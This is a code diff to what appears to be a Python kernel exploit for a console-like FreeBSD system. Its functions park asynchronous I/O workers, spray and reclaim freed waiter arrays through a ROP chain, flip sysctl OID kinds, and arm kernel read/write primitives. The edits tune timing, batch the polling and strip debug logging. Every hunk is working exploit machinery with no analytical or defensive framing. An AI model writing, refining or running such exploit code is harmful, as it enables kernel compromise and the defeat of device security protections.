@@ -119,6 +119,7 @@ thread_attrs_restored = False
 
 scratch_states = alloc(0x400)
 scratch_qword = alloc(8)
+sleep_time = alloc(16)
 
 tuning = {
     "waiters": 18,
@@ -190,10 +191,9 @@ def q64(buf, index):
 
 
 def msleep(msec):
-    req = alloc(16)
-    p64(req, 0, msec // 1000)
-    p64(req, 8, (msec % 1000) * 1000000)
-    sc.syscalls.nanosleep(req)
+    p64(sleep_time, 0, msec // 1000)
+    p64(sleep_time, 8, (msec % 1000) * 1000000)
+    sc.syscalls.nanosleep(sleep_time)
 
 
 # ---- thread affinity -----------------------------------------------------
@@ -254,24 +254,20 @@ def restore_thread_attributes():
 
 
 def do_sysctl(mib, old_ptr, old_len, new_ptr, new_len):
-    for i, value in enumerate(mib):
-        p32(sysctl_mib_buf, i * 4, value)
-        sysctl_mib_buf[i * 4 + 4 : i * 4 + 8] = b"\x00\x00\x00\x00"
-    sysctl_len_buf[0:8] = b"\x00" * 8
-    p32(sysctl_len_buf, 0, old_len or 0)
+    for i, val in enumerate(mib):
+        p32(sysctl_mib_buf, i * 4, val)
+    p64(sysctl_len_buf, 0, old_len or 0)
 
     rv = sysint(
         sc.syscalls.sysctl,
         sysctl_mib_buf,
         len(mib),
-        get_ref_addr(old_ptr) if old_ptr else 0,
-        get_ref_addr(sysctl_len_buf) if old_ptr else 0,
-        get_ref_addr(new_ptr) if new_ptr else 0,
+        old_ptr or 0,
+        sysctl_len_buf if old_ptr else 0,
+        new_ptr or 0,
         new_len or 0,
     )
-    ln = 0
-    if old_ptr:
-        ln = u32(sysctl_len_buf, 0)
+    ln = u32(sysctl_len_buf, 0) if old_ptr else 0
     return rv, ln
 
 
@@ -461,6 +457,7 @@ def park_aio_workers(limit):
     sent = 0
     parked = 0
     quiet_rounds = 0
+
     while sent < limit and quiet_rounds < 2:
         for _ in range(4):
             if sent >= limit:
@@ -471,7 +468,6 @@ def park_aio_workers(limit):
             p32(ids, sent * 4, id_)
             sent += 1
 
-        msleep(60)
         sysint(sc.syscalls.aio_multi_poll, ids, sent, states)
 
         in_flight = 0
@@ -484,28 +480,29 @@ def park_aio_workers(limit):
         else:
             parked = in_flight
             quiet_rounds = 0
+            if sent < limit:
+                msleep(15)
 
 
 def wait_for_pending_requests(candidate_ids, candidate_count, wanted_count):
-    poll_id = alloc(4)
-    poll_state = alloc(4)
+    states = alloc(4 * candidate_count + 4)
     pending_indices = []
     seen = {}
 
     for _ in range(150):
         if len(pending_indices) >= wanted_count:
             break
+        sysint(sc.syscalls.aio_multi_poll, candidate_ids, candidate_count, states)
+
         for index in range(candidate_count):
             if len(pending_indices) >= wanted_count:
                 break
-            if index not in seen:
-                poll_id[0:4] = candidate_ids[index * 4 : index * 4 + 4]
-                sysint(sc.syscalls.aio_multi_poll, poll_id, 1, poll_state)
-                if u32(poll_state, 0) & 0xFFFF == 1:
-                    pending_indices.append(index)
-                    seen[index] = True
+            if index not in seen and u32(states, index * 4) & 0xFFFF == 1:
+                pending_indices.append(index)
+                seen[index] = True
+
         if len(pending_indices) < wanted_count:
-            msleep(20)
+            msleep(10)
 
     if len(pending_indices) != wanted_count:
         raise Exception(
@@ -526,9 +523,7 @@ def claim_pending_requests(count):
             raise Exception("aio request submission failed")
         p32(candidate_ids, index * 4, id_)
 
-    stage("claim: waiting for %d pending" % count)
     pending = wait_for_pending_requests(candidate_ids, candidate_count, count)
-    stage("claim: %d resolved" % len(pending))
 
     ids = alloc(4 * count)
     for output, index in enumerate(pending):
@@ -583,14 +578,10 @@ def run_reclaim_batch(group, nodes):
 
     churn_request = 0x80000000 | (requests * request_size << 16) | 0x4101
 
-    group_ids_addr = get_ref_addr(group["ids"])
-
-    stage("reclaim preflight (ioctls on fd -1)")
     preflight = sysint(sc.syscalls.ioctl, M64, churn_request, nodes)
     if preflight != -1:
         report("reclaim", "invalid churn request %d" % preflight)
         return None
-    stage("reclaim preflight ok")
 
     executable = get_reclaim_executable()
     chain = executable.chain
@@ -598,49 +589,44 @@ def run_reclaim_batch(group, nodes):
     executable.setup_front_chain()
 
     for _ in range(churn_before):
-        chain.push_syscall(SYSCALL["ioctl"], M64, churn_request, get_ref_addr(nodes))
+        chain.push_syscall(SYSCALL["ioctl"], M64, churn_request, nodes)
 
     chain.push_syscall(
         SYSCALL["aio_multi_wait"],
-        group_ids_addr,
+        group["ids"],
         group["count"],
-        get_ref_addr(scratch_states),
+        scratch_states,
         0,
-        get_ref_addr(timeout),
+        timeout,
     )
 
     for _ in range(churn_after):
-        chain.push_syscall(SYSCALL["ioctl"], M64, churn_request, get_ref_addr(nodes))
+        chain.push_syscall(SYSCALL["ioctl"], M64, churn_request, nodes)
 
     spray_returns = alloc(8 * sprays)
     spray_returns_addr = get_ref_addr(spray_returns)
+    sprayed_ids_addr = get_ref_addr(sprayed_ids)
     for i in range(sprays):
         ret_addr = spray_returns_addr + i * 8
         chain.push_syscall(
             SYSCALL["aio_submit_cmd"],
             AIO_CMD_READ,
-            get_ref_addr(nodes),
+            nodes,
             requests,
             3,
-            get_ref_addr(sprayed_ids) + i * 4 * requests,
+            sprayed_ids_addr + i * 4 * requests,
         )
         chain.push_store_rax_into_memory(ret_addr)
 
     executable.setup_padding_chain()
     executable.setup_post_chain()
     executable.setup_back_chain()
-    stage("executing reclaim chain")
     executable.execute()
-    stage(
-        "reclaim chain executed, rv=%#x errno=%d"
-        % (executable.chain.return_value, executable.errno)
-    )
 
     accepted = 0
     for i in range(sprays):
         if u32(spray_returns, i * 8) == 0:
             accepted += 1
-    stage("reclaim accepted %d/%d" % (accepted, sprays))
     return accepted
 
 
@@ -649,17 +635,16 @@ def cancel_request(group, index):
         sc.syscalls.aio_multi_cancel,
         get_ref_addr(group["ids"]) + index * 4,
         1,
-        get_ref_addr(scratch_states),
+        scratch_states,
     )
 
 
 def first_pending_request(group):
-    stage("first_pending_request: polling")
     sysint(
         sc.syscalls.aio_multi_poll,
-        get_ref_addr(group["ids"]),
+        group["ids"],
         group["count"],
-        get_ref_addr(scratch_states),
+        scratch_states,
     )
     for index in range(group["count"]):
         state = u32(scratch_states, index * 4) & 0xFFFF
@@ -673,7 +658,6 @@ def first_pending_request(group):
 
 def reclaim_waiter_array(tag, first_target, second_target):
     global off
-    stage("reclaim_waiter_array (%s): claiming pending requests" % tag)
     group = claim_pending_requests(tuning["waiters"])
     remember_armed_group(group)
 
@@ -686,13 +670,11 @@ def reclaim_waiter_array(tag, first_target, second_target):
         report(tag, "%d reclaim submits failed" % (tuning["sprays"] - accepted))
         return None
 
-    stage("reclaim_waiter_array (%s): querying first pending request" % tag)
     first_pending = first_pending_request(group)
     if first_pending < 0:
         report(tag, "no pending request is available")
         return None
 
-    stage("reclaim_waiter_array (%s): first pending is %d" % (tag, first_pending))
     return {
         "group": group,
         "first_pending": first_pending,
@@ -706,7 +688,6 @@ def flip_oid_kind(tag, reclaim, mib, target):
         report(tag, "oid is hidden before the flip")
         return False
 
-    stage("flip_oid_kind (%s): starting flip, kind=%#x, target=%#x" % (tag, kind, target))
     i = 0
     while i < reclaim["heads"] and kind != target:
         cancel_request(reclaim["group"], i)
@@ -723,7 +704,6 @@ def flip_oid_kind(tag, reclaim, mib, target):
     if kind != target:
         report(tag, "not enough waiter heads")
         return False
-    stage("flip_oid_kind (%s): flip succeeded" % tag)
     return True
 
 
@@ -901,25 +881,18 @@ def arm_kernel_read_write():
             return False
 
     raise_fd_limit()
-    stage("workers parking")
     park_aio_workers(tuning["workerBlockers"])
-    stage("workers parked")
 
     if not make_oid_writable("arm a", mib_a, a["kindByte3"]):
         return False
-    stage("arming a done")
     if not steer_oid_window():
         return False
-    stage("steering done")
     if not test_kernel_read():
         return False
-    stage("read test done")
     if not make_oid_writable("arm c", mib_b, b["kindByte3"]):
         return False
-    stage("arming c done")
     if not test_kernel_write():
         return False
-    stage("write test done")
 
     return prepare_high_writer()
 
@@ -1674,7 +1647,7 @@ def release_aio_workers():
         return
     try:
         sysint(sc.syscalls.close, worker_park["write_fd"])
-        msleep(120)
+        msleep(50)
         sysint(sc.syscalls.close, worker_park["read_fd"])
     except:
         report("Cleanup", "could not release aio workers")
